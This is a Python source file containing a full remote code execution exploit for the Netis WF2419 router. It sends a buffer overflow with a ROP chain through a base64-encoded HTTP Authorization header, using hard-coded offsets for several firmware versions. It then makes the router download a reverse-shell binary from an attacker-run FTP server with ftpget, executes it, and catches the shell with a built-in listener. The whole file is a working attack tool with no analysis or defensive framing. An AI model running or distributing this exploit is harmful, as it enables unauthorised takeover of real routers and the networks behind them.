import os
import time
import socket
import struct
import base64
import argparse
import threading


class FTPServer:
    def __init__(self, file, port, passive_port):
        """
        FTP server that serves a file on the provided listening port.

        :param file: Full path to file.
        :type file: str

        :param port: Port to listen on.
        :type port: int
        """
        if not file or not port:
            raise Exception('File and port are both required parameters.')

        if not os.path.exists(file):
            raise Exception('File %s does not exist.' % file)

        self.file = file
        self.port = port
        self.passive_port = passive_port
        self.ready = False
        self.served = False
        self.server_thread = None
        self.client = None
        self.ftp_sock = None

    def _serve(self):
        """
        Thread that will host the listening FTP server. It will continue
        until the file is served.
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', self.port))
        sock.listen(5)

        self.ready = True
        (self.client, _) = sock.accept()

        self.client.send(b'220 Hello.\r\n')

        while self.server_thread.is_alive():
            cmd = self.client.recv(256)
            cmd = cmd.decode('utf8')
            cmd = cmd[:4].strip().upper()
            if not cmd:
                continue
            try:
                fn = getattr(self, '_ftp_%s' % cmd.lower())
                fn()
                if cmd == "QUIT":
                    break
            except Exception as e:
                print(e)
                break

        self.client.close()
        sock.close()

    def _ftp_user(self):
        """
        Process FTP USER message. Respond 230 ok to anything that is passed.
        User will likely be anonymous anyway.
        """
        self.client.send(b'230 ok\r\n')

    def _ftp_type(self):
        """
        Process FTP TYPE message. It's trying to tell us that it wants to
        transfer files as binary. Doing that anyway.
        """
        self.client.send(b'200 binary mode.\r\n')

    def _ftp_pasv(self):
        """
        Process FTP PASV message. Wants us to set passive mode, this is where
        we need the other port.
        """
        self.ftp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ftp_sock.bind(('0.0.0.0', self.passive_port))
        self.ftp_sock.listen(1)
        ip, port = self.ftp_sock.getsockname()
        ip = bytes(ip, 'utf8')
        self.client.send(b'227 Entering Passive Mode (%s,%u,%u).\r\n' % (
            b','.join(ip.split(b'.')), port >> 8 & 0xFF, port & 0xff))

    def _ftp_size(self):
        """
        Process FTP SIZE message. Send code 213 with the files size.
        """
        self.client.send(b'213 %d\r\n' % os.path.getsize(self.file))

    def _ftp_retr(self):
        """
        Process FTP RETR message. Status 150 means it's happening. Send the
        file over the socket that was opened in the PASV message, then send
        226 to say it's all over.
        """
        self.client.send(b'150 ok\r\n')
        data_sock, addr = self.ftp_sock.accept()

        fi = open(self.file, 'rb')

        data = fi.read(1024)
        while data:
            data_sock.send(data)
            data = fi.read(1024)

        fi.close()
        data_sock.close()
        self.client.send(b'226 ok\r\n')

    def _ftp_quit(self):
        """
        Process FTP QUIT message. Just quit. It's over. Leave.
        """
        self.client.send(b'221 Goodbye.\r\n')

    def join(self, timeout=None):
        """
        Wait until the thread terminates or the timeout is reached.

        :param timeout: Time, in seconds, to wait for the thread to complete.
        :type timeout: int
        """
        self.server_thread.join(timeout)

    def is_alive(self):
        """
        Return true if the FTP server is running.

        :return: True if server thread is running, False otherwise.
        """
        return self.server_thread.is_alive()

    def start(self):
        """
        Start the FTP server.
        """
        self.server_thread = threading.Thread(target=self._serve)
        self.server_thread.setDaemon(True)

        self.server_thread.start()

        while not self.ready:
            time.sleep(.1)


class ListenServer:
    def __init__(self, port):
        """
        Listening server that acts as a VERY basic netcat listener.

        :param port: Port to listen for connections.
        :type port: int
        """
        if port is None:
            raise Exception('Port is a required argument.')

        self.port = port
        self._listen_sock = None
        self._server = None

    def _receive_loop(self):
        """
        Loop that constantly tries to receive data from the connection.
        Called within a thread to prevent deadlock caused by nothing to read.
        """
        while self._listen_socket is not None:
            try:
                result = self._listen_socket.recv(2048)
            except OSError:
                # This can happen when the user quits the reverse shell.
                return

            try:
                print(result.decode('utf8'), end='', flush=True)
            except UnicodeDecodeError:
                print('ERROR: Unicode decode error. Probably binary data.')
                continue

    def _listen(self):
        """
        Listen for connections. When a connection is made send user commands
        until "exit" is received.
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', self.port))
        sock.listen(5)

        (self._listen_socket, addr) = sock.accept()

        receive_loop = threading.Thread(target=self._receive_loop)
        receive_loop.setDaemon(True)
        receive_loop.start()

        command = b''
        while command != b'exit':
            command = input('$ ')
            command = bytes(command, 'utf8')
            if command == b'':
                continue
            self._listen_socket.send(command + b'\n')
            time.sleep(1)

        self._listen_socket.close()
        self._listen_sock = None
        sock.close()

    def join(self, timeout=None):
        """
        Wait until the thread terminates.
        """
        self._server.join(timeout)

    def is_alive(self):
        """
        Is the listening server alive.

        :return: True if the server is still running, otherwise False.
        """
        return self._server.is_alive()

    def is_connected(self):
        return self._listen_socket is not None

    def start(self):
        """
        Start the listening server.
        """
        self._server = threading.Thread(target=self._listen)
        self._server.setDaemon(True)
        self._server.start()


class Exploit:
    def __init__(self, ver, gcc_base, rop2_offset, system_offset):
        """
        Create exploit for Netis WF2419.

        :param ver: Version string.
        :type ver: string

        :param gcc_base: Base of libgcc.so
        :type gcc_base: int

        :param rop2_offset: Offset of the second rop gadget from libc.so
        :type rop2_offset: int

        :param system_offset: Offset of system in libc.so
        :type system_offset: int
        """
        self.version = ver
        self.libc_base = 0x2aaef000
        self.gcc_base = gcc_base
        self.rop1 = struct.pack('>L', self.gcc_base + 0x8B20)
        self.rop2 = struct.pack('>L', self.libc_base + rop2_offset)
        self.rop3 = struct.pack('>L', self.gcc_base + 0x17A4)
        self.rop4 = struct.pack('>L', self.gcc_base + 0xABD0)
        self.system = struct.pack('>L', self.libc_base + system_offset)

    def send(self, host, port, command, wait=False):
        """
        Send the exploit to the target attempting to execute the provided
        command.

        :param host: Target IP address.
        :type host: str

        :param port: Target listening port.
        :type port: int

        :param command: Command to execute on the target.
        :type command: bytes

        :param wait: Wait for a response from the target.
        :type wait: bool
        """
        s0 = self.rop3
        s1 = b'BBBB'
        s2 = b'CCCC'
        s3 = self.system
        s4 = self.rop2
        stack_ra = self.rop4
        ra = self.rop1

        overflow = b'a:%s' % \
                   (b'A' * (0x3C - 2)) + \
                   stack_ra + s0 + s1 + s2 + s3 + s4 + ra + command

        packet = b'GET / HTTP/1.1\r\n'
        packet += b'Host: %s:%d\r\n' % (bytes(host, 'utf8'), port)
        packet += b'Authorization: Basic %s\r\n' % base64.b64encode(overflow)
        packet += b'User-Agent: Real UserAgent\r\n\r\n'

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            s.connect((host, port))
        except OSError:
            print('No response. Sleeping 30s to wait for the target to come '
                  'back...', end='', flush=True)
            s.close()
            time.sleep(30)
            self.send(host, port, command, wait)
            return

        s.send(packet)
        if wait:
            s.recv(2048)
        s.close()

        # Sending an exploit crashes the server even if it fails. The server
        # is immediately restarted, but let's give it a few seconds to catch
        # its breath before we go again.
        time.sleep(5)


def send_reverse_shell(host, port, callback_ip, callback_port, server):
    """
    Send exploit attempting to request a reverse shell.

    :param host: Target IP address.
    :type host: str

    :param port: Target listening port.
    :type port: int

    :param callback_ip: Public IP address to call back to. If the IP is a
    gateway then some for of port forwarding must be enabled.
    :type callback_ip: bytes

    :param callback_port: Callback listening port.
    :type callback_port: int

    :param server: HTTP server that hosts the reverse shell binary.
    :type server: `:class: FTPServer`

    :return: Exploit object on success, or None if no exploit succeeded.
    """

    print('[+] Sending exploit to send reverse shell binary.')
    command = b'ftpget -P %d %s /tmp/a /;' % (callback_port, callback_ip)

    exploits = [
        Exploit('2.2.41694', 0x2ab72000, 0x20820, 0x2ae60),
        Exploit('2.2.36123', 0x2ab72000, 0x20650, 0x2ac90),
        Exploit('1.2.29433', 0x2ab71000, 0x20780, 0x2ab70),
        Exploit('1.2.27001', 0x2ab71000, 0x20780, 0x2ab70),
        Exploit('1.2.25087', 0x2ab71000, 0x20780, 0x2ab70),
        Exploit('1.2.21610', 0x2ab71000, 0x20490, 0x2a880),
        Exploit('1.2.17932', 0x2ab71000, 0x2db50, 0x23bf0)
    ]

    for exploit in exploits:
        print('\t[+] Trying version %s...' % exploit.version, end='',
              flush=True)
        exploit.send(host, port, command)
        if not server.is_alive():
            print('Success!\n')
            time.sleep(5)
            return exploit
        print('Fail!')

    return None


def main():
    arg_parse = argparse.ArgumentParser(
        description='Full RCE for WF2419 that will connect a reverse shell. '
                    'In the likely event you are throwing this from behind a '
                    'gateway router you will need two ports that will be '
                    'forwarded back to you and need to know your public IP '
                    'address.')

    arg_parse.add_argument('--ip', help="Target IP address")
    arg_parse.add_argument('--port', help="Target listening port")

    arg_parse.add_argument('--public-ip',
                           help="Public IP address, or DHCP address if on the "
                                "same network.")
    arg_parse.add_argument('--callback-port', help="Callback port.")
    arg_parse.add_argument('--ftp-port', help="FTP passive port.")
    arg_parse.add_argument('--rs', help="Reverse shell binary.")

    args = arg_parse.parse_args()

    target_ip = args.ip
    target_port = int(args.port)
    callback_ip = bytes(args.public_ip, 'utf8')
    callback_port = int(args.callback_port)
    ftp_passive_port = int(args.ftp_port)
    reverse_shell_bin = args.rs

    # Start the HTTP server so it's ready when the exploit calls back.
    http_server = FTPServer(reverse_shell_bin, callback_port, ftp_passive_port)
    http_server.start()

    # Send exploit that will push the reverse shell binary to the target.
    exploit = send_reverse_shell(
        target_ip, target_port, callback_ip, callback_port, http_server)

    if exploit is None:
        print('[-] Exploit not delivered. No callback was made.')
        exit(1)

    # Set up the listening server to catch the callback from the revere shell
    # binary.
    listen = ListenServer(callback_port)
    listen.start()

    # The next two commands are broken into two exploit throws because the
    # command can only by 40 bytes long. Depending on your public IP address and
    # callback port you may go over that.
    print('\n[+] Adding execute permission to reverse shell.')
    command = b'chmod +x /tmp/a;'
    exploit.send(target_ip, target_port, command, wait=False)

    print('\n[+] Executing the reverse shell.')
    command = b'/tmp/a %s %d;' % (callback_ip, callback_port)
    exploit.send(target_ip, target_port, command, wait=False)

    if listen.is_connected():
        listen.join()
    else:
        print('No connection made.')

    print('Program exit.')


if '__main__' == __name__:
    main()
